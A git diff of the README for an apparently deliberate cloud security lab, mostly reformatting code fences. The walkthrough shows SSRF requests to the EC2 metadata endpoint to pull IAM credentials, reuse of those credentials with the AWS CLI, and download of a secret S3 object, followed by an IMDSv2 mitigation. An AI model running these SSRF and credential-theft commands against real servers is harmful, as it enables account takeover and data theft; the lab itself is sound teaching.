@@ -29,12 +29,13 @@ it is possible to `destroy` the stack when done and the created resources will b
 
 3. At this point it is possible to run the HTTP request to pull out the metadata information:
    First check that the server respond to curl:
-   ```ShellSession 
+   ``` ShellSession 
    $ curl http://<public_ipv4_address>/ 
    ```
 4. Explore metadata vulnerability  
    Check for some of the metadata categories available:
-   ```ShellSession
+
+   ``` ShellSession
    $ curl http://<public_ip>/?url=http://169.254.169.254/latest/meta-data/
    ```
    The output should include all categories of information that the ec2 instance would be able to access.
@@ -44,7 +45,7 @@ it is possible to `destroy` the stack when done and the created resources will b
    {Instance-Profile} - The instance profile name will be unique to each environment.  
    This will be the value listed under security-credentials - 2nd url below
 
-    ```ShellSession
+    ``` ShellSession
     http://<public_ip>/?url=http://169.254.169.254/latest/meta-data/iam/
     http://<public_ip>/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials
     http://<public_ip>/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/{Instance-Profile}
@@ -53,11 +54,14 @@ it is possible to `destroy` the stack when done and the created resources will b
     ![](ssrf_1.png)  
 
 6. Extract the VM AWS credentials  
-   These are the credentials of the instance profile that is being used by the ec2 instance. By making a profile using these credentials, we will be able to execute AWS API calls using the identity of the ec2 instance instance profile.  
+   These are the credentials of the instance profile that is being used by the ec2 instance.  
+   By making a profile using these credentials, we will be able to execute AWS API calls using the identity of the ec2 instance instance profile.  
    Copy the value of `AccessKeyId`, `SecretAccessKey` and `Token`, and use it to configure a profile called c-demo.
-   ```ShellSession
+
+   ``` ShellSession
    $ aws configure --profile c-demo
-   ```  
+   ``` 
+ 
    Add the `Token` by adding `aws_session_token` to your aws credential. By default, credential files are stored in the following places:  
    `Windows: C:\Users\username\.aws\credentials`
    `Linux: ~/.aws/credentials`
@@ -71,20 +75,23 @@ it is possible to `destroy` the stack when done and the created resources will b
   
 7. Let's get it done!  
    At this point, you should be able to query caller identity API from your workstation.
-   List the available s3 buckets:
+   List the available s3 buckets:  
+
    ```ShellSession
    $ aws s3 ls --profile c-demo
    ```  
 
-   Run the below command, substituting {bucket_name} for the name of the ec2-metadata bucket returned in the previous step.
-   ```ShellSession
+   Run the below command, substituting {bucket_name} for the name of the ec2-metadata bucket returned in the previous step.  
+   
+   ``` ShellSession
    $ aws s3 ls {bucket_name} --profile c-demo
    ```  
    There's another object in here, our `top_secret_file`  
    As an attacker, we might want to download this file. This process is called data exfiltration.
 
 8. Exfiltrate the data!  
-   Let's download the file locally and examine the contents
+   Let's download the file locally and examine the contents  
+
    ```ShellSession
    $ aws s3 cp s3://{bucket_name}/top_secret_file ./ --profile c-demo
    ```
@@ -94,12 +101,15 @@ it is possible to `destroy` the stack when done and the created resources will b
 ## Mitigate the breach
 
 Run a CLI command to force the ec2 instance to require a http token when issuing a command, by using IMDS v2.
-You can use the ec2 `instance-id` provided by the terraform output.
+You can use the ec2 `instance-id` provided by the terraform output.  
+
 ```ShellSession
 $ aws ec2 modify-instance-metadata-options --instance-id "{INSTANCE_ID}" --http-tokens required --http-endpoint enabled 
-```
+```  
+
 The ec2 is still running, meaning that the response will return the State as Pending.
-Run the same exploits against the web server:
+Run the same exploits against the web server:  
+
 ```ShellSession
 $ curl http://<public_ip>/?url=http://169.254.169.254/latest/meta-data/iam/
 $ curl http://<public_ip>/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials
